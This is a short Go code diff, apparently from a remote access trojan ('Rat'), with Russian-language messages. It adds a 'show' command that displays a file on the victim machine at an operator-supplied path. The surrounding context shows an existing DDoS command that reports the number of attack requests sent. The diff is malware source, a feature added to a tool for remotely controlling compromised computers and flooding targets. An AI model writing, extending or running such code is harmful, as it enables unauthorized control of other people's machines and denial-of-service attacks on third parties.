@@ -51,6 +51,8 @@ func (r *Rat) commandsSwitch(text string) {
 		go r.ddosCmd(args)
 	case "info":
 		go r.infoCmd()
+	case "show":
+		go r.showCmd(args)
 	default:
 		go r.defaultCmd()
 	}
@@ -325,4 +327,17 @@ func (r *Rat) ddosCmd(args string) {
 
 	s, t := attack.Result(ctx)
 	r.Transport.Send("Атака завершена! Всего запросов: %d, успешных: %d", t, s)
+}
+
+func (r *Rat) showCmd(args string) {
+	if args == "" {
+		r.Transport.Send("Пожалуйста, укажите путь к файлу.")
+		return
+	}
+
+	err := r.Engine.Media.Show(args)
+	if err != nil {
+		r.Transport.Send("Ошибка: %v", err)
+		return
+	}
 }
